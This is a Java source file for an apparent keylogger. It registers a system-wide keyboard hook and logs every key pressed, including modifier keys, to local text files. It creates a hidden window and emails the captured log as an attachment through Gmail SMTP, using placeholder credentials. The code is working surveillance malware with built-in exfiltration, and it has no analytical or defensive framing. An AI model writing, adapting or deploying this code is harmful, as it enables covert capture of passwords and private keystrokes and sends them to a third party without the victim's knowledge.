package com.trigger.utils;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.trigger.utils.FileContract;
import com.trigger.utils.FileOverWrite;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.text.SimpleDateFormat;  
import java.util.Date;
import javax.swing.JFrame;

import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class JKey1 implements NativeKeyListener {
	
	private static FileContract fc;
	
        static public void SendAttachmentInEmail()
        {
            

  // Recipient's email ID needs to be mentioned.
        String to = "sender's_email_address";
        // Sender's email ID needs to be mentioned
        String from = "Receiver's_email_address";
        final String username = "Receiver's_email_address";//change accordingly
        final String password = "Reciver's_email_address_password";//change accordingly
        // Assuming you are sending email through relay.jangosmtp.net
        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");
        // Get the Session object.
        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });
        try {
            // Create a default MimeMessage object.
            Message message = new MimeMessage(session);
            // Set From: header field of the header.
            message.setFrom(new InternetAddress(from));
            // Set To: header field of the header.
            message.setRecipients(Message.RecipientType.CC,
                    InternetAddress.parse(to));
//            message.setRecipients(Message.RecipientType.CC,
//                    InternetAddress.parse("archakbasak@gmail.com"));
            // Set Subject: header field
            message.setSubject("Attachment");
            // Create the message part
            BodyPart messageBodyPart = new MimeBodyPart();
            // Now set the actual message
            messageBodyPart.setText("Please find the attachment below");
            // Create a multipar message
            Multipart multipart = new MimeMultipart();
            // Set text message part
            multipart.addBodyPart(messageBodyPart);
            // Part two is attachment
            messageBodyPart = new MimeBodyPart();
            String filename = "test.txt";
            DataSource source = new FileDataSource(filename);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);
            multipart.addBodyPart(messageBodyPart);
            // Send the complete message parts
            message.setContent(multipart);
            // Send message
            Transport.send(message);
            System.out.println("Email Sent Successfully !!");
        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
 }

    
	public void nativeKeyPressed(NativeKeyEvent e) 
	{
		String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
                FileWriter fw = null;
                
                
            try {
                fw = new FileWriter("test.txt", true);
                
                fw.write(keyPressed);
                fw.close();
                
            } catch (IOException ex) {
                Logger.getLogger(JKey1.class.getName()).log(Level.SEVERE, null, ex);
            }
            
                
		System.out.println("Key Pressed: " + keyPressed);
		System.out.println("Key Pressed: " + e.getKeyCode());
		switch(e.getKeyCode())
		{
			case NativeKeyEvent.VC_ALT_L: 		fc.writeString("Alt[");
												return;
			case NativeKeyEvent.VC_ALT_R:	 	fc.writeString("Alt[");
												return;
			case NativeKeyEvent.VC_CONTROL_L: 	fc.writeString("Ctrl[");
												return;
			case NativeKeyEvent.VC_CONTROL_R: 	fc.writeString("Ctrl[");
												return;
			case NativeKeyEvent.VC_SHIFT_L: 	fc.writeString("^[");
												return;
			case NativeKeyEvent.VC_SHIFT_R: 	fc.writeString("^[");
												return;
			case NativeKeyEvent.VC_ENTER:	 	fc.writeEnter();
												return;
			case NativeKeyEvent.VC_BACKSPACE:	fc.writeString("(");
												fc.writeChar('\u2190');
												fc.writeString(")");
												return;
			case NativeKeyEvent.VC_SEMICOLON: 	fc.writeChar(';');
												return;
			case NativeKeyEvent.VC_PERIOD:	 	fc.writeChar('.');
												return;
			case NativeKeyEvent.VC_COMMA: 		fc.writeChar(',');
												return;
			case NativeKeyEvent.VC_BACK_SLASH: 	fc.writeChar('\\');
												return;
			case NativeKeyEvent.VC_SLASH:	 	fc.writeChar('/');
												return;
			case NativeKeyEvent.VC_MINUS:	 	fc.writeChar('-');
												return;
			case NativeKeyEvent.VC_EQUALS:	 	fc.writeChar('=');
												return;
			case NativeKeyEvent.VC_SPACE:	 	fc.writeChar(' ');
												return;
			case NativeKeyEvent.VC_KP_ADD:	 	fc.writeChar('+');
												return;
			case NativeKeyEvent.VC_KP_MULTIPLY:	fc.writeChar('*');
												return;
			case NativeKeyEvent.VC_OPEN_BRACKET:fc.writeChar('[');
												return;
			case NativeKeyEvent.VC_CLOSE_BRACKET:fc.writeChar(']');
												return;
			case NativeKeyEvent.VC_F9:			this.unregisterHook();
												return;
		}
		
		fc.writeString(keyPressed);	
                    
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Key Released: " + keyPressed);
		switch(e.getKeyCode())
		{
			case NativeKeyEvent.VC_ALT_L: 		fc.writeString("]Alt");
												return;
			case NativeKeyEvent.VC_ALT_R:	 	fc.writeString("]Alt");
												return;
			case NativeKeyEvent.VC_CONTROL_L: 	fc.writeString("]Ctrl");
												return;
			case NativeKeyEvent.VC_CONTROL_R: 	fc.writeString("]Ctrl");
												return;
			case NativeKeyEvent.VC_SHIFT_L: 	fc.writeString("]^");
												return;
			case NativeKeyEvent.VC_SHIFT_R: 	fc.writeString("]^");
												return;
		}
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}

	public static void main(String[] args) {
		
		if(args==null || args.length==0)
			fc = new FileOverWrite();			
		
		fc.initWriter("serverLog.txt");
                
                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");  
                Date date = new Date(); 
                FileWriter fw = null;
		try {
                fw = new FileWriter("test.txt", true);
                String str1="\n";
                fw.write(str1);
                String str2=formatter.format(date);
                fw.write(str2);                
            
                fw.close();
                
            } catch (IOException ex) {
                Logger.getLogger(JKey1.class.getName()).log(Level.SEVERE, null, ex);
            }
                
                JFrame frame = new JFrame("My First GUI");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setSize(300,300);
                frame.setVisible(false);
           
           SendAttachmentInEmail();
		
           try {
            GlobalScreen.registerNativeHook();
            
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new JKey1());
	}
	
	private void unregisterHook()
	{
		try{
            GlobalScreen.unregisterNativeHook();
            fc.closeWriter();
        }catch(Exception ex){
            System.err.println(ex);
        }  
	}

}
